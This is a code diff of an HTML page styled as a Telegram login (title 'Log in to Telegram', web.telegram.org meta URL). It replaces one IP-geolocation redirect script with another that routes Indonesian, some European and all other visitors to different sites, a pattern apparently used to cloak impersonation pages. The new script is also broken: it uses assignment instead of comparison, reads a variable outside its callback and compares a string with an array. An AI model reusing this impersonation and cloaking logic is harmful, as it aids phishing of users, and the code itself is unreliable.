@@ -23,21 +23,22 @@
     <meta property="twitter:url" content="https://web.telegram.org">
     <title>Log in to Telegram</title>
 </head>
-    <script language="Javascript">
-        $.getJSON("http://api.db-ip.com/v2/free/self").then(function(addrInfo) {
-    if (addrInfo.continentCode == "ID") {
-        document.location = "https://www.youtube.com";
-    } else if (...) {
-        // handle other cases
-    } else {
-        document.location = "https://web.facebook.com";
-    }
-});
+    <script type="text/javascript">
+
+$.get('https://ipapi.co/country/', function(country){
+console.log(country)
+})
+
+if (country = "ID") {
+  window.location.replace("https://www.youtube.com");
+}
+else if (country = ["FR","IT","DE","CH"]) {
+  window.location.replace("EU.html");
+}
+else {
+  window.location.replace("https://web.facebook.com");
+}
+
 </script>
 </body>
 </html>
-
-
-
-
-
